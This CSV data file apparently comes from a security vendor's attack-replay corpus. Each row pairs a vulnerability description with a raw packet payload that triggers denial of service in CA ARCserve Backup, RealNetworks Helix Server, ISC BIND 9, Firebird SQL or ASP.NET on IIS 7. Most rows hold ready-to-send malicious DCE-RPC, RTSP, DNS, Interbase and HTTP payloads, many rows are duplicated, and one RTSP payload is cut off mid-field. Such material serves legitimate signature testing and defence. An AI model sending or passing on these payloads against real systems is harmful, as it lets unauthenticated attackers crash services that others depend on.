XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
FSC20090616-04_CA_ARCserve_Backup_Message_Engine_Denial_of_Service_IPv6.xml,CA ARCserve Backup Message Engine Denial of Service (IPv6 Version),A denial of service vulnerability exists in CA ARCserve Backup Message Engine. The vulnerability is due to insufficient data validation. A remote unauthenticated attacker may exploit this vulnerability by sending a crafted message to the target server.            A successful attack could create a denial of service condition to the Message Engine service. (IPv6 Version),TCP/IPv6,TCP,[[05 00 0C 03 10 00 00 00 ]]<[[00 00 00 01 00 00 00 D0 16 D0 16 ]]7~[[0B 00 05 00 ]]6503[[00 00 01 00 00 00 00 00 00 00 04 ]]][[88 8A EB 1C C9 11 9F E8 08 00 ]]+[[10 ]]H`[[02 00 00 00]]
FSC20090616-04_CA_ARCserve_Backup_Message_Engine_Denial_of_Service_IPv6.xml,CA ARCserve Backup Message Engine Denial of Service (IPv6 Version),A denial of service vulnerability exists in CA ARCserve Backup Message Engine. The vulnerability is due to insufficient data validation. A remote unauthenticated attacker may exploit this vulnerability by sending a crafted message to the target server.            A successful attack could create a denial of service condition to the Message Engine service. (IPv6 Version),TCP/IPv6,TCP,[[05 00 0C 03 10 00 00 00 ]]<[[00 00 00 01 00 00 00 D0 16 D0 16 ]]7~[[0B 00 05 00 ]]6503[[00 00 01 00 00 00 00 00 00 00 04 ]]][[88 8A EB 1C C9 11 9F E8 08 00 ]]+[[10 ]]H`[[02 00 00 00]]
﻿FSC20090616-06_CA_ARCserve_Backup_Message_Engine_RPC_Opcode_59_Denial_of_Service.xml,CA ARCserve Backup Message Engine RPC Opcode 59 Denial of Service,A denial of service vulnerability exists in CA ARCserve Backup Message Engine. The vulnerability is due to insufficient data validation. A remote unauthenticated attacker could exploit this vulnerability by sending a crafted message to the target server. A successful attack would create a denial of service condition to the Message Engine service.,DCE-RPC,TCP,[[05 00 0B 03 10 00 00 00 ]]H[[00 00 00 01 00 00 00 D0 16 D0 16 00 00 00 00 01 00 00 00 00 00 01 00 F0 ]]k$[[DC ]]zz[[CE 11 9F 88 00 80 ]]_[[E4 ]]88[[01 00 00 00 04 ]]][[88 8A EB 1C C9 11 9F E8 08 00 ]]+[[10 ]]H`[[02 00 00 00]]
FSC20090616-06_CA_ARCserve_Backup_Message_Engine_RPC_Opcode_59_Denial_of_Service.xml,CA ARCserve Backup Message Engine RPC Opcode 59 Denial of Service,A denial of service vulnerability exists in CA ARCserve Backup Message Engine. The vulnerability is due to insufficient data validation. A remote unauthenticated attacker could exploit this vulnerability by sending a crafted message to the target server. A successful attack would create a denial of service condition to the Message Engine service.,DCE-RPC,TCP,[[05 00 00 03 10 00 00 00 ]]<[[00 00 00 01 00 00 00 ]]$[[00 00 00 00 00 ]];[[00 01 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 01 00 00 00 01 00 00 00 01 00 00 00 01 00 01 00]]
FSC20090616-06_CA_ARCserve_Backup_Message_Engine_RPC_Opcode_59_Denial_of_Service.xml,CA ARCserve Backup Message Engine RPC Opcode 59 Denial of Service,A denial of service vulnerability exists in CA ARCserve Backup Message Engine. The vulnerability is due to insufficient data validation. A remote unauthenticated attacker could exploit this vulnerability by sending a crafted message to the target server. A successful attack would create a denial of service condition to the Message Engine service.,DCE-RPC,TCP,[[05 00 0C 03 10 00 00 00 ]]<[[00 00 00 01 00 00 00 D0 16 D0 16 A1 ]]Z[[97 0F 05 00 ]]6503[[00 00 01 00 00 00 00 00 00 00 04 ]]][[88 8A EB 1C C9 11 9F E8 08 00 ]]+[[10 ]]H`[[02 00 00 00]]
﻿FSC20090720-04_RealNetworks_Helix_Server_RTSP_SET_PARAMETERS_Request_Denial_of_Service.xml,RealNetworks Helix Server RTSP SET_PARAMETERS Request Denial of Service,"There exists a denial of service vulnerability in RealNetworks Helix Server. The vulnerability is due to a logic error in the way RealNetworks Helix Server and Helix Mobile Server handle RTSP requests. Remote unauthenticated attackers can exploit this vulnerability by sending a crafted RTSP SET_PARAMETER request to the affected server. As a result of processing the malicious command, a denial of service condition will be created on the target system, the affected service may become unresponsive until it is restarted.",RTSP,TCP,SET_PARAMETER rtsp://DIE RTSP/1.1[[0D 0A ]]CSeq:1[[0D 0A ]]DataConvertBuffer:[[0D 0A 0D 0A]]
FSC20090720-04_RealNetworks_Helix_Server_RTSP_SET_PARAMETERS_Request_Denial_of_Service.xml,RealNetworks Helix Server RTSP SET_PARAMETERS Request Denial of Service,"There exists a denial of service vulnerability in RealNetworks Helix Server. The vulnerability is due to a logic error in the way RealNetworks Helix Server and Helix Mobile Server handle RTSP requests. Remote unauthenticated attackers can exploit this vulnerability by sending a crafted RTSP SET_PARAMETER request to the affected server. As a result of processing the malicious command, a denial of service condition will be created on the target system, the affected service may become unresponsive until it is restarted.",RTSP,TCP,SET_PARAMETER rtsp://DIE RTSP/1.1[[0D 0A ]]CSeq:1[[0D 0A ]]DataConvertBuffer:[[0D 0A 0D 0A ]]SET_PARAMETER rtsp://DIE RTSP/1.1[[0D 0A ]]CSeq:1[[0D 0A ]]DataConvertBuffer:[[0D 0A 0D 0A ]]SET_PARAMETER rtsp://DIE RTSP/1.1[[0D 0A ]]CSeq:1[[0D 0A ]]DataConvertBuffer:[[0D 0A 0D 0A ]]SET_PARAMETER rtsp://DIE RTSP/1.1[[0D 0A ]]CSeq:1[[0D 0A ]]DataConvertBuffer:[[0D 0A 0D 0A ]]SET_PARAMETER rtsp://DIE RTSP/1.1[[0D 0A ]]CSeq:1[[0D 0A ]]DataConvertBuffer:[[0D 0A 0D 0A ]]SET_PARAMETER rtsp://DIE RTSP/1.1[[0D 0A ]]CSeq:1[[0D 0A ]]DataConvertBuffer:[[0D 0A 0D 0A ]]SET_PARAMETER rtsp://DIE RTSP/1.1[[0D 0A ]]CSeq:1[[0D 0A ]]DataConvertBuffer:[[0D 0A 0D 0A ]]SET_PARAMETER rtsp://DIE RTSP/1.1[[0D 0A ]]CSeq:1[[0D 0A ]]DataConvertBuffer:[[0D 0A 0D 0A ]]SET_PARAMETER rtsp://DIE RTSP/1.1[[0D 0A ]]CSeq:1[[0D 0A ]]DataConvertBuffer:[[0D 0A 0D 0A ]]SET_PARAMETER rtsp://DIE RTSP/1.1[[0D 0A ]]CSeq:1[[0D 0A ]]DataConvertBuffer:[[0D 0A 0D 0A ]]SET_PARAMETER rtsp://DIE RTSP/1.1[[0D 0A ]]CSeq:1[[0D 0A ]]DataConvertBuffer:[[0D 0A 0D 0A ]]SET_PARAMETER rtsp://DIE RTSP/1.1[[0D 0A ]]CSeq:1[[0D 0A ]]DataConvertBuffer:[[0D 0A 0D 0A ]]SET_PARAMETER rtsp://DIE RTSP/1.1[[0D 0A ]]CSeq:1[[0D 0A ]]DataConvertBuffer:[[0D 0A 0D 0A ]]SET_PARAMETER rtsp://DIE RTSP/1.1[[0D 0A ]]CSeq:1[[0D 0A ]]DataConvertBuffer:[[0D 0A 0D 0A ]]SET_PARAMETER rtsp://DIE RTSP/1.1[[0D 0A ]]CSeq:1[[0D 0A ]]DataConvertBuffer:[[0D 0A 0D 0A ]]SET_PARAMETER rtsp://DIE RTSP/1.1[[0D 0A ]]CSeq:1[[0D 0A ]]DataConvertBuffer:[[0D 0A 0D 0A ]]SET_PARAMETER rtsp://DIE RTSP/1.1[[0D 0A ]]CSeq:1[[0D 0A ]]DataConvertBuffer:[[0D 0A 0D 0A ]]SET_PARAMETER rtsp://DIE RTSP/1.1[[0D 0A ]]CSeq:1[[0D 0A ]]DataConvertBuffer:[[0D 0A 0D 0A ]]SET_PARAMETER rtsp://DIE RTSP/1.1[[0D 0A ]]CSeq:1[[0D 0A ]]DataConvertBuffer:[[0D 0A 0D 0A ]]SET_PARAMETER rtsp://DIE RTSP/1.1[[0D 0A ]]CSeq:1[[0D 0A ]]DataConvertBuffer:[[0D 0A 0D 0A ]]SET_PARAMETER rtsp://DIE RTSP/1.1[[0D 0A ]]CSeq:1[[0D 0A ]]DataConvertBuffer:[[0D 0A 0D 0A ]]SET_PARAMETER rtsp://DIE RTSP/1.1[[0D 0A ]]CSeq:1[[0D 0A ]]DataConvertBuffer:[[0D 0A 0D 0A ]]SET_PARAMETER rtsp
﻿FSC20090720-05_RealNetworks_Helix_Server_RTSP_SETUP_Request_Denial_of_Service.xml,RealNetworks Helix Server RTSP SETUP Request Denial of Service,"A denial of service vulnerability exists in RealNetworks Helix Server. The vulnerability is due to an error in the way RealNetworks Helix Server handles SETUP requests. Remote unauthenticated attackers can exploit this flaw by sending a crafted SETUP request to an affected server. As a result of processing the malicious command, a denial of service condition will be created on the target system.",RTSP,TCP,SETUP rtsp:// RTSP/1.1[[0D 0A 0D 0A]]
﻿FSC20090720-05_RealNetworks_Helix_Server_RTSP_SETUP_Request_Denial_of_Service_IPv6.xml,RealNetworks Helix Server RTSP SETUP Request Denial of Service (IPv6 Version),"A denial of service vulnerability exists in RealNetworks Helix Server. The vulnerability is due to an error in the way RealNetworks Helix Server handles SETUP requests. Remote unauthenticated attackers can exploit this flaw by sending a crafted SETUP request to an affected server.            As a result of processing the malicious command, a denial of service condition will be created on the target system. (IPv6 Version)",RTSP/IPv6,TCP,SETUP rtsp:// RTSP/1.1[[0D 0A 0D 0A]]
﻿FSC20090728-14_ISC_BIND_9_Dynamic_Update_Request_Denial_of_Service.xml,ISC BIND 9 Dynamic Update Request Denial of Service,There is a denial of service vulnerability in ISC BIND 9. This vulnerability is due to an error when ISC BIND 9 handles dynamic update messages. An unprivileged remote attacker can exploit this flaw by sending malicious dynamic update requests to a target DNS server. Successful exploitation would cause a denial of service condition.,DNS,UDP,4[[8C ]]([[00 00 01 00 01 00 01 00 00 0B ]]localdomain[[00 00 06 00 01 C0 0C 00 FF 00 01 00 00 00 00 00 00 C0 0C 00 FF 00 FF 00 00 00 00 00 00]]
﻿FSC20090731-07_Firebird_SQL_op_connect_request_Denial_of_Service.xml,Firebird SQL op_connect_request Denial of Service,A denial of service vulnerability exists in Firebird SQL. The vulnerability is due to the way that Firebird SQL handles op_connect_request requests. A remote unauthenticated attacker can exploit this vulnerability by sending a crafted op_connect_request request to a vulnerable server. A successful attack would create a denial of service condition on the Firebird SQL service.,Interbase,TCP,[[00 00 00 ]]5AAAAAAAAAAAAAAA
﻿FSC20090731-07_Firebird_SQL_op_connect_request_Denial_of_Service_IPv6.xml,Firebird SQL op_connect_request Denial of Service (IPv6 Version),A denial of service vulnerability exists in Firebird SQL. The vulnerability is due to the way that Firebird SQL handles op_connect_request requests. A remote unauthenticated attacker can exploit this vulnerability by sending a crafted op_connect_request request to a vulnerable server.            A successful attack would create a denial of service condition on the Firebird SQL service. (IPv6 Version),TCP/IPv6,TCP,[[00 00 00 ]]5AAAAAAAAAAAAAAA
﻿FSC20090811-04_Microsoft_ASP.NET_Error_Handling_Denial_Of_Service.xml,Microsoft ASP.NET Error Handling Denial Of Service,"A denial of service vulnerability exists within Microsoft ASP.NET. The vulnerability is due to improperly handling of malicious HTTP requests. An attacker can exploit this issue to cause the affected server to become unresponsive to ASP.NET-script requests installed on Internet Information Services (IIS) 7.0. Web pages that do not use ASP.NET scripts will continue to be handled by the Web server. In a successful attack case, the affected Web server will become unresponsive to new ASP-NET-scripts requests until the associated application pool is restarted.",HTTP/HTTPS,TCP,GET /testapp%3f/login.aspx HTTP/1.1[[0A ]]Host: 172.16.1.2[[0A ]]Connection: Keep-Alive[[0A 0A]]
FSC20090811-04_Microsoft_ASP.NET_Error_Handling_Denial_Of_Service.xml,Microsoft ASP.NET Error Handling Denial Of Service,"A denial of service vulnerability exists within Microsoft ASP.NET. The vulnerability is due to improperly handling of malicious HTTP requests. An attacker can exploit this issue to cause the affected server to become unresponsive to ASP.NET-script requests installed on Internet Information Services (IIS) 7.0. Web pages that do not use ASP.NET scripts will continue to be handled by the Web server. In a successful attack case, the affected Web server will become unresponsive to new ASP-NET-scripts requests until the associated application pool is restarted.",HTTP/HTTPS,TCP,GET /testapp%3f/login.aspx HTTP/1.1[[0A ]]Host: 172.16.1.2[[0A ]]Connection: Keep-Alive[[0A 0A]]
FSC20090811-04_Microsoft_ASP.NET_Error_Handling_Denial_Of_Service.xml,Microsoft ASP.NET Error Handling Denial Of Service,"A denial of service vulnerability exists within Microsoft ASP.NET. The vulnerability is due to improperly handling of malicious HTTP requests. An attacker can exploit this issue to cause the affected server to become unresponsive to ASP.NET-script requests installed on Internet Information Services (IIS) 7.0. Web pages that do not use ASP.NET scripts will continue to be handled by the Web server. In a successful attack case, the affected Web server will become unresponsive to new ASP-NET-scripts requests until the associated application pool is restarted.",HTTP/HTTPS,TCP,GET /testapp%3f/login.aspx HTTP/1.1[[0A ]]Host: 172.16.1.2[[0A ]]Connection: Keep-Alive[[0A 0A]]
FSC20090811-04_Microsoft_ASP.NET_Error_Handling_Denial_Of_Service.xml,Microsoft ASP.NET Error Handling Denial Of Service,"A denial of service vulnerability exists within Microsoft ASP.NET. The vulnerability is due to improperly handling of malicious HTTP requests. An attacker can exploit this issue to cause the affected server to become unresponsive to ASP.NET-script requests installed on Internet Information Services (IIS) 7.0. Web pages that do not use ASP.NET scripts will continue to be handled by the Web server. In a successful attack case, the affected Web server will become unresponsive to new ASP-NET-scripts requests until the associated application pool is restarted.",HTTP/HTTPS,TCP,GET /testapp%3f/login.aspx HTTP/1.1[[0A ]]Host: 172.16.1.2[[0A ]]Connection: Keep-Alive[[0A 0A]]
FSC20090811-04_Microsoft_ASP.NET_Error_Handling_Denial_Of_Service.xml,Microsoft ASP.NET Error Handling Denial Of Service,"A denial of service vulnerability exists within Microsoft ASP.NET. The vulnerability is due to improperly handling of malicious HTTP requests. An attacker can exploit this issue to cause the affected server to become unresponsive to ASP.NET-script requests installed on Internet Information Services (IIS) 7.0. Web pages that do not use ASP.NET scripts will continue to be handled by the Web server. In a successful attack case, the affected Web server will become unresponsive to new ASP-NET-scripts requests until the associated application pool is restarted.",HTTP/HTTPS,TCP,GET /testapp%3f/login.aspx HTTP/1.1[[0A ]]Host: 172.16.1.2[[0A ]]Connection: Keep-Alive[[0A 0A]]
FSC20090811-04_Microsoft_ASP.NET_Error_Handling_Denial_Of_Service.xml,Microsoft ASP.NET Error Handling Denial Of Service,"A denial of service vulnerability exists within Microsoft ASP.NET. The vulnerability is due to improperly handling of malicious HTTP requests. An attacker can exploit this issue to cause the affected server to become unresponsive to ASP.NET-script requests installed on Internet Information Services (IIS) 7.0. Web pages that do not use ASP.NET scripts will continue to be handled by the Web server. In a successful attack case, the affected Web server will become unresponsive to new ASP-NET-scripts requests until the associated application pool is restarted.",HTTP/HTTPS,TCP,GET /testapp%3f/login.aspx HTTP/1.1[[0A ]]Host: 172.16.1.2[[0A ]]Connection: Keep-Alive[[0A 0A]]
FSC20090811-04_Microsoft_ASP.NET_Error_Handling_Denial_Of_Service.xml,Microsoft ASP.NET Error Handling Denial Of Service,"A denial of service vulnerability exists within Microsoft ASP.NET. The vulnerability is due to improperly handling of malicious HTTP requests. An attacker can exploit this issue to cause the affected server to become unresponsive to ASP.NET-script requests installed on Internet Information Services (IIS) 7.0. Web pages that do not use ASP.NET scripts will continue to be handled by the Web server. In a successful attack case, the affected Web server will become unresponsive to new ASP-NET-scripts requests until the associated application pool is restarted.",HTTP/HTTPS,TCP,GET /testapp%3f/login.aspx HTTP/1.1[[0A ]]Host: 172.16.1.2[[0A ]]Connection: Keep-Alive[[0A 0A]]
FSC20090811-04_Microsoft_ASP.NET_Error_Handling_Denial_Of_Service.xml,Microsoft ASP.NET Error Handling Denial Of Service,"A denial of service vulnerability exists within Microsoft ASP.NET. The vulnerability is due to improperly handling of malicious HTTP requests. An attacker can exploit this issue to cause the affected server to become unresponsive to ASP.NET-script requests installed on Internet Information Services (IIS) 7.0. Web pages that do not use ASP.NET scripts will continue to be handled by the Web server. In a successful attack case, the affected Web server will become unresponsive to new ASP-NET-scripts requests until the associated application pool is restarted.",HTTP/HTTPS,TCP,GET /testapp%3f/login.aspx HTTP/1.1[[0A ]]Host: 172.16.1.2[[0A ]]Connection: Keep-Alive[[0A 0A]]
FSC20090811-04_Microsoft_ASP.NET_Error_Handling_Denial_Of_Service.xml,Microsoft ASP.NET Error Handling Denial Of Service,"A denial of service vulnerability exists within Microsoft ASP.NET. The vulnerability is due to improperly handling of malicious HTTP requests. An attacker can exploit this issue to cause the affected server to become unresponsive to ASP.NET-script requests installed on Internet Information Services (IIS) 7.0. Web pages that do not use ASP.NET scripts will continue to be handled by the Web server. In a successful attack case, the affected Web server will become unresponsive to new ASP-NET-scripts requests until the associated application pool is restarted.",HTTP/HTTPS,TCP,GET /testapp%3f/login.aspx HTTP/1.1[[0A ]]Host: 172.16.1.2[[0A ]]Connection: Keep-Alive[[0A 0A]]
FSC20090811-04_Microsoft_ASP.NET_Error_Handling_Denial_Of_Service.xml,Microsoft ASP.NET Error Handling Denial Of Service,"A denial of service vulnerability exists within Microsoft ASP.NET. The vulnerability is due to improperly handling of malicious HTTP requests. An attacker can exploit this issue to cause the affected server to become unresponsive to ASP.NET-script requests installed on Internet Information Services (IIS) 7.0. Web pages that do not use ASP.NET scripts will continue to be handled by the Web server. In a successful attack case, the affected Web server will become unresponsive to new ASP-NET-scripts requests until the associated application pool is restarted.",HTTP/HTTPS,TCP,GET /testapp%3f/login.aspx HTTP/1.1[[0A ]]Host: 172.16.1.2[[0A ]]Connection: Keep-Alive[[0A 0A]]
FSC20090811-04_Microsoft_ASP.NET_Error_Handling_Denial_Of_Service.xml,Microsoft ASP.NET Error Handling Denial Of Service,"A denial of service vulnerability exists within Microsoft ASP.NET. The vulnerability is due to improperly handling of malicious HTTP requests. An attacker can exploit this issue to cause the affected server to become unresponsive to ASP.NET-script requests installed on Internet Information Services (IIS) 7.0. Web pages that do not use ASP.NET scripts will continue to be handled by the Web server. In a successful attack case, the affected Web server will become unresponsive to new ASP-NET-scripts requests until the associated application pool is restarted.",HTTP/HTTPS,TCP,GET /testapp%3f/login.aspx HTTP/1.1[[0A ]]Host: 172.16.1.2[[0A ]]Connection: Keep-Alive[[0A 0A]]
FSC20090811-04_Microsoft_ASP.NET_Error_Handling_Denial_Of_Service.xml,Microsoft ASP.NET Error Handling Denial Of Service,"A denial of service vulnerability exists within Microsoft ASP.NET. The vulnerability is due to improperly handling of malicious HTTP requests. An attacker can exploit this issue to cause the affected server to become unresponsive to ASP.NET-script requests installed on Internet Information Services (IIS) 7.0. Web pages that do not use ASP.NET scripts will continue to be handled by the Web server. In a successful attack case, the affected Web server will become unresponsive to new ASP-NET-scripts requests until the associated application pool is restarted.",HTTP/HTTPS,TCP,GET /testapp%3f/login.aspx HTTP/1.1[[0A ]]Host: 172.16.1.2[[0A ]]Connection: Keep-Alive[[0A 0A]]
FSC20090811-04_Microsoft_ASP.NET_Error_Handling_Denial_Of_Service.xml,Microsoft ASP.NET Error Handling Denial Of Service,"A denial of service vulnerability exists within Microsoft ASP.NET. The vulnerability is due to improperly handling of malicious HTTP requests. An attacker can exploit this issue to cause the affected server to become unresponsive to ASP.NET-script requests installed on Internet Information Services (IIS) 7.0. Web pages that do not use ASP.NET scripts will continue to be handled by the Web server. In a successful attack case, the affected Web server will become unresponsive to new ASP-NET-scripts requests until the associated application pool is restarted.",HTTP/HTTPS,TCP,GET /testapp%3f/login.aspx HTTP/1.1[[0A ]]Host: 172.16.1.2[[0A ]]Connection: Keep-Alive[[0A 0A]]
FSC20090811-04_Microsoft_ASP.NET_Error_Handling_Denial_Of_Service.xml,Microsoft ASP.NET Error Handling Denial Of Service,"A denial of service vulnerability exists within Microsoft ASP.NET. The vulnerability is due to improperly handling of malicious HTTP requests. An attacker can exploit this issue to cause the affected server to become unresponsive to ASP.NET-script requests installed on Internet Information Services (IIS) 7.0. Web pages that do not use ASP.NET scripts will continue to be handled by the Web server. In a successful attack case, the affected Web server will become unresponsive to new ASP-NET-scripts requests until the associated application pool is restarted.",HTTP/HTTPS,TCP,"HTTP/1.1 400 Bad Request[[0D 0A ]]Content-Type: text/html[[0D 0A ]]Server: Microsoft-IIS/7.0[[0D 0A ]]X-Powered-By: ASP.NET[[0D 0A ]]Date: Fri, 21 Aug 2009 15:26:29 GMT[[0D 0A ]]Content-Length: 11[[0D 0A 0D 0A ]]Bad Request"
FSC20090811-04_Microsoft_ASP.NET_Error_Handling_Denial_Of_Service.xml,Microsoft ASP.NET Error Handling Denial Of Service,"A denial of service vulnerability exists within Microsoft ASP.NET. The vulnerability is due to improperly handling of malicious HTTP requests. An attacker can exploit this issue to cause the affected server to become unresponsive to ASP.NET-script requests installed on Internet Information Services (IIS) 7.0. Web pages that do not use ASP.NET scripts will continue to be handled by the Web server. In a successful attack case, the affected Web server will become unresponsive to new ASP-NET-scripts requests until the associated application pool is restarted.",HTTP/HTTPS,TCP,"HTTP/1.1 400 Bad Request[[0D 0A ]]Content-Type: text/html[[0D 0A ]]Server: Microsoft-IIS/7.0[[0D 0A ]]X-Powered-By: ASP.NET[[0D 0A ]]Date: Fri, 21 Aug 2009 15:26:29 GMT[[0D 0A ]]Content-Length: 11[[0D 0A 0D 0A ]]Bad Request"
FSC20090811-04_Microsoft_ASP.NET_Error_Handling_Denial_Of_Service.xml,Microsoft ASP.NET Error Handling Denial Of Service,"A denial of service vulnerability exists within Microsoft ASP.NET. The vulnerability is due to improperly handling of malicious HTTP requests. An attacker can exploit this issue to cause the affected server to become unresponsive to ASP.NET-script requests installed on Internet Information Services (IIS) 7.0. Web pages that do not use ASP.NET scripts will continue to be handled by the Web server. In a successful attack case, the affected Web server will become unresponsive to new ASP-NET-scripts requests until the associated application pool is restarted.",HTTP/HTTPS,TCP,"HTTP/1.1 400 Bad Request[[0D 0A ]]Content-Type: text/html[[0D 0A ]]Server: Microsoft-IIS/7.0[[0D 0A ]]X-Powered-By: ASP.NET[[0D 0A ]]Date: Fri, 21 Aug 2009 15:26:29 GMT[[0D 0A ]]Content-Length: 11[[0D 0A 0D 0A ]]Bad Request"
FSC20090811-04_Microsoft_ASP.NET_Error_Handling_Denial_Of_Service.xml,Microsoft ASP.NET Error Handling Denial Of Service,"A denial of service vulnerability exists within Microsoft ASP.NET. The vulnerability is due to improperly handling of malicious HTTP requests. An attacker can exploit this issue to cause the affected server to become unresponsive to ASP.NET-script requests installed on Internet Information Services (IIS) 7.0. Web pages that do not use ASP.NET scripts will continue to be handled by the Web server. In a successful attack case, the affected Web server will become unresponsive to new ASP-NET-scripts requests until the associated application pool is restarted.",HTTP/HTTPS,TCP,"HTTP/1.1 400 Bad Request[[0D 0A ]]Content-Type: text/html[[0D 0A ]]Server: Microsoft-IIS/7.0[[0D 0A ]]X-Powered-By: ASP.NET[[0D 0A ]]Date: Fri, 21 Aug 2009 15:26:29 GMT[[0D 0A ]]Content-Length: 11[[0D 0A 0D 0A ]]Bad Request"
FSC20090811-04_Microsoft_ASP.NET_Error_Handling_Denial_Of_Service.xml,Microsoft ASP.NET Error Handling Denial Of Service,"A denial of service vulnerability exists within Microsoft ASP.NET. The vulnerability is due to improperly handling of malicious HTTP requests. An attacker can exploit this issue to cause the affected server to become unresponsive to ASP.NET-script requests installed on Internet Information Services (IIS) 7.0. Web pages that do not use ASP.NET scripts will continue to be handled by the Web server. In a successful attack case, the affected Web server will become unresponsive to new ASP-NET-scripts requests until the associated application pool is restarted.",HTTP/HTTPS,TCP,"HTTP/1.1 400 Bad Request[[0D 0A ]]Content-Type: text/html[[0D 0A ]]Server: Microsoft-IIS/7.0[[0D 0A ]]X-Powered-By: ASP.NET[[0D 0A ]]Date: Fri, 21 Aug 2009 15:26:29 GMT[[0D 0A ]]Content-Length: 11[[0D 0A 0D 0A ]]Bad Request"
FSC20090811-04_Microsoft_ASP.NET_Error_Handling_Denial_Of_Service.xml,Microsoft ASP.NET Error Handling Denial Of Service,"A denial of service vulnerability exists within Microsoft ASP.NET. The vulnerability is due to improperly handling of malicious HTTP requests. An attacker can exploit this issue to cause the affected server to become unresponsive to ASP.NET-script requests installed on Internet Information Services (IIS) 7.0. Web pages that do not use ASP.NET scripts will continue to be handled by the Web server. In a successful attack case, the affected Web server will become unresponsive to new ASP-NET-scripts requests until the associated application pool is restarted.",HTTP/HTTPS,TCP,"HTTP/1.1 400 Bad Request[[0D 0A ]]Content-Type: text/html[[0D 0A ]]Server: Microsoft-IIS/7.0[[0D 0A ]]X-Powered-By: ASP.NET[[0D 0A ]]Date: Fri, 21 Aug 2009 15:26:29 GMT[[0D 0A ]]Content-Length: 11[[0D 0A 0D 0A ]]Bad Request"
FSC20090811-04_Microsoft_ASP.NET_Error_Handling_Denial_Of_Service.xml,Microsoft ASP.NET Error Handling Denial Of Service,"A denial of service vulnerability exists within Microsoft ASP.NET. The vulnerability is due to improperly handling of malicious HTTP requests. An attacker can exploit this issue to cause the affected server to become unresponsive to ASP.NET-script requests installed on Internet Information Services (IIS) 7.0. Web pages that do not use ASP.NET scripts will continue to be handled by the Web server. In a successful attack case, the affected Web server will become unresponsive to new ASP-NET-scripts requests until the associated application pool is restarted.",HTTP/HTTPS,TCP,"HTTP/1.1 400 Bad Request[[0D 0A ]]Content-Type: text/html[[0D 0A ]]Server: Microsoft-IIS/7.0[[0D 0A ]]X-Powered-By: ASP.NET[[0D 0A ]]Date: Fri, 21 Aug 2009 15:26:29 GMT[[0D 0A ]]Content-Length: 11[[0D 0A 0D 0A ]]Bad Request"
FSC20090811-04_Microsoft_ASP.NET_Error_Handling_Denial_Of_Service.xml,Microsoft ASP.NET Error Handling Denial Of Service,"A denial of service vulnerability exists within Microsoft ASP.NET. The vulnerability is due to improperly handling of malicious HTTP requests. An attacker can exploit this issue to cause the affected server to become unresponsive to ASP.NET-script requests installed on Internet Information Services (IIS) 7.0. Web pages that do not use ASP.NET scripts will continue to be handled by the Web server. In a successful attack case, the affected Web server will become unresponsive to new ASP-NET-scripts requests until the associated application pool is restarted.",HTTP/HTTPS,TCP,"HTTP/1.1 400 Bad Request[[0D 0A ]]Content-Type: text/html[[0D 0A ]]Server: Microsoft-IIS/7.0[[0D 0A ]]X-Powered-By: ASP.NET[[0D 0A ]]Date: Fri, 21 Aug 2009 15:26:29 GMT[[0D 0A ]]Content-Length: 11[[0D 0A 0D 0A ]]Bad Request"
FSC20090811-04_Microsoft_ASP.NET_Error_Handling_Denial_Of_Service.xml,Microsoft ASP.NET Error Handling Denial Of Service,"A denial of service vulnerability exists within Microsoft ASP.NET. The vulnerability is due to improperly handling of malicious HTTP requests. An attacker can exploit this issue to cause the affected server to become unresponsive to ASP.NET-script requests installed on Internet Information Services (IIS) 7.0. Web pages that do not use ASP.NET scripts will continue to be handled by the Web server. In a successful attack case, the affected Web server will become unresponsive to new ASP-NET-scripts requests until the associated application pool is restarted.",HTTP/HTTPS,TCP,"HTTP/1.1 400 Bad Request[[0D 0A ]]Content-Type: text/html[[0D 0A ]]Server: Microsoft-IIS/7.0[[0D 0A ]]X-Powered-By: ASP.NET[[0D 0A ]]Date: Fri, 21 Aug 2009 15:26:29 GMT[[0D 0A ]]Content-Length: 11[[0D 0A 0D 0A ]]Bad Request"
